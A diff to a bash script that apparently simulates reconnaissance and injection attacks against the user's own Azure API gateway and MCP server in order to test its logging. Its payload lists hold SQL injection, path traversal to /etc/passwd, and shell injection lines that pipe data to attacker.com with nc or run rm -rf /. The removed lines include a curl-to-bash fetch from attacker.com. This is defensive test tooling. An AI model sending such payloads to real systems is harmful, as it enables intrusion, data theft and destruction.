@@ -39,11 +39,27 @@ echo ""
 # Load environment
 APIM_GATEWAY_URL=$(azd env get-value APIM_GATEWAY_URL 2>/dev/null)
 WORKSPACE_ID=$(azd env get-value LOG_ANALYTICS_WORKSPACE_ID 2>/dev/null)
+MCP_APP_CLIENT_ID=$(azd env get-value MCP_APP_CLIENT_ID 2>/dev/null)
 
 if [ -z "$APIM_GATEWAY_URL" ]; then
-    echo -e "${RED}Error: APIM_GATEWAY_URL not found. Run 'azd provision' first.${NC}"
+    echo -e "${RED}Error: APIM_GATEWAY_URL not found. Run 'azd up' first.${NC}"
     exit 1
 fi
+
+if [ -z "$MCP_APP_CLIENT_ID" ]; then
+    echo -e "${RED}Error: MCP_APP_CLIENT_ID not found. Run 'azd up' first.${NC}"
+    exit 1
+fi
+
+# Get OAuth token
+echo -e "${BLUE}Getting OAuth token...${NC}"
+TOKEN=$(az account get-access-token --resource "$MCP_APP_CLIENT_ID" --query accessToken -o tsv)
+if [ -z "$TOKEN" ]; then
+    echo -e "${RED}Error: Could not get access token.${NC}"
+    exit 1
+fi
+echo -e "${GREEN}✓ OAuth token acquired${NC}"
+echo ""
 
 echo -e "${YELLOW}This script simulates a multi-vector attack to test:${NC}"
 echo ""
@@ -58,21 +74,53 @@ read -p "Press Enter to start the attack simulation..."
 
 echo ""
 echo -e "${CYAN}================================================================${NC}"
-echo -e "${CYAN}  Phase 1: Reconnaissance${NC}"
+echo -e "${CYAN}  Initializing MCP Session${NC}"
 echo -e "${CYAN}================================================================${NC}"
 echo ""
+
+# Initialize MCP session
+curl -s -D /tmp/mcp-headers.txt --max-time 10 -X POST "${APIM_GATEWAY_URL}/sherpa/mcp" \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -H "Accept: application/json, text/event-stream" \
+    -d '{"jsonrpc":"2.0","method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"attacker-sim","version":"1.0"}},"id":1}' > /dev/null 2>&1 || true
+
+SESSION_ID=$(grep -i "mcp-session-id" /tmp/mcp-headers.txt 2>/dev/null | sed 's/.*: *//' | tr -d '\r\n') || true
+[ -z "$SESSION_ID" ] && SESSION_ID="session-$(date +%s)"
 
 # Attacker ID for correlation
 ATTACKER_ID="attacker-$(date +%s)"
 echo "Attacker correlation ID: $ATTACKER_ID"
+echo "Session ID: $SESSION_ID"
+echo ""
+
+# Helper function to send attack
+send_attack() {
+    local tool_name="$1"
+    local arg_name="$2"
+    local payload="$3"
+    
+    curl -s --max-time 10 -X POST "${APIM_GATEWAY_URL}/sherpa/mcp" \
+        -H "Authorization: Bearer $TOKEN" \
+        -H "Content-Type: application/json" \
+        -H "Accept: application/json, text/event-stream" \
+        -H "Mcp-Session-Id: $SESSION_ID" \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"name\":\"$tool_name\",\"arguments\":{\"$arg_name\":\"$payload\"}},\"id\":$RANDOM}" > /dev/null 2>&1 || true
+}
+
+echo -e "${CYAN}================================================================${NC}"
+echo -e "${CYAN}  Phase 1: Reconnaissance${NC}"
+echo -e "${CYAN}================================================================${NC}"
 echo ""
 
 echo "Probing for available tools..."
 for i in 1 2 3; do
-    curl -s -X POST "${APIM_GATEWAY_URL}/mcp/messages" \
+    curl -s --max-time 10 -X POST "${APIM_GATEWAY_URL}/sherpa/mcp" \
+        -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
-        -H "x-correlation-id: ${ATTACKER_ID}-recon-$i" \
-        -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}' > /dev/null 2>&1 || true
+        -H "Accept: application/json, text/event-stream" \
+        -H "Mcp-Session-Id: $SESSION_ID" \
+        -d '{"jsonrpc":"2.0","method":"tools/list","params":{},"id":'$i'}' > /dev/null 2>&1 || true
     sleep 0.2
 done
 echo -e "${GREEN}✓ Sent 3 reconnaissance requests${NC}"
@@ -89,15 +137,11 @@ SQL_PAYLOADS=(
     "1; SELECT * FROM passwords"
     "admin'--"
     "' UNION SELECT username, password FROM users--"
-    "'; INSERT INTO admins VALUES('hacker', 'pwned'); --"
 )
 
 for payload in "${SQL_PAYLOADS[@]}"; do
     echo "  Attempting: ${payload:0:40}..."
-    curl -s -X POST "${APIM_GATEWAY_URL}/mcp/messages" \
-        -H "Content-Type: application/json" \
-        -H "x-correlation-id: ${ATTACKER_ID}-sql" \
-        -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"search-trails\",\"arguments\":{\"query\":\"$payload\"}}}" > /dev/null 2>&1 || true
+    send_attack "get_weather" "location" "$payload"
     sleep 0.3
 done
 echo ""
@@ -111,18 +155,13 @@ echo ""
 
 PATH_PAYLOADS=(
     "../../../etc/passwd"
-    "..\\..\\..\\windows\\system32\\config\\sam"
-    "%2e%2e%2f%2e%2e%2fetc/shadow"
     "....//....//etc/passwd"
     "/proc/self/environ"
 )
 
 for payload in "${PATH_PAYLOADS[@]}"; do
     echo "  Attempting: $payload"
-    curl -s -X POST "${APIM_GATEWAY_URL}/mcp/messages" \
-        -H "Content-Type: application/json" \
-        -H "x-correlation-id: ${ATTACKER_ID}-path" \
-        -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"read-file\",\"arguments\":{\"path\":\"$payload\"}}}" > /dev/null 2>&1 || true
+    send_attack "check_trail_conditions" "trail_id" "$payload"
     sleep 0.3
 done
 echo ""
@@ -135,19 +174,14 @@ echo -e "${CYAN}================================================================
 echo ""
 
 SHELL_PAYLOADS=(
-    "ls | cat /etc/passwd"
-    "; rm -rf /"
-    "\$(curl attacker.com/malware.sh | bash)"
-    "& ping -c 10 attacker.com"
-    "| nc attacker.com 1234 < /etc/passwd"
+    "summit; cat /etc/passwd"
+    "summit | nc attacker.com 1234"
+    "summit && rm -rf /"
 )
 
 for payload in "${SHELL_PAYLOADS[@]}"; do
     echo "  Attempting: ${payload:0:40}..."
-    curl -s -X POST "${APIM_GATEWAY_URL}/mcp/messages" \
-        -H "Content-Type: application/json" \
-        -H "x-correlation-id: ${ATTACKER_ID}-shell" \
-        -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"execute\",\"arguments\":{\"command\":\"$payload\"}}}" > /dev/null 2>&1 || true
+    send_attack "get_weather" "location" "$payload"
     sleep 0.3
 done
 echo ""
@@ -167,10 +201,7 @@ PROMPT_PAYLOADS=(
 
 for payload in "${PROMPT_PAYLOADS[@]}"; do
     echo "  Attempting: ${payload:0:50}..."
-    curl -s -X POST "${APIM_GATEWAY_URL}/mcp/messages" \
-        -H "Content-Type: application/json" \
-        -H "x-correlation-id: ${ATTACKER_ID}-prompt" \
-        -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"chat\",\"arguments\":{\"message\":\"$payload\"}}}" > /dev/null 2>&1 || true
+    send_attack "get_weather" "location" "$payload"
     sleep 0.3
 done
 echo ""
@@ -178,14 +209,14 @@ echo -e "${GREEN}✓ Sent ${#PROMPT_PAYLOADS[@]} prompt injection attempts${NC}"
 echo ""
 
 # Count total attacks
-TOTAL_ATTACKS=$((${#SQL_PAYLOADS[@]} + ${#PATH_PAYLOADS[@]} + ${#SHELL_PAYLOADS[@]} + ${#PROMPT_PAYLOADS[@]}))
+TOTAL_ATTACKS=$((3 + ${#SQL_PAYLOADS[@]} + ${#PATH_PAYLOADS[@]} + ${#SHELL_PAYLOADS[@]} + ${#PROMPT_PAYLOADS[@]}))
 
 echo -e "${CYAN}================================================================${NC}"
 echo -e "${CYAN}  Attack Simulation Complete${NC}"
 echo -e "${CYAN}================================================================${NC}"
 echo ""
 echo "Total attacks sent: $TOTAL_ATTACKS"
-echo "Attacker correlation ID: $ATTACKER_ID"
+echo "Attacker session ID: $SESSION_ID"
 echo ""
 echo "What to check now:"
 echo ""
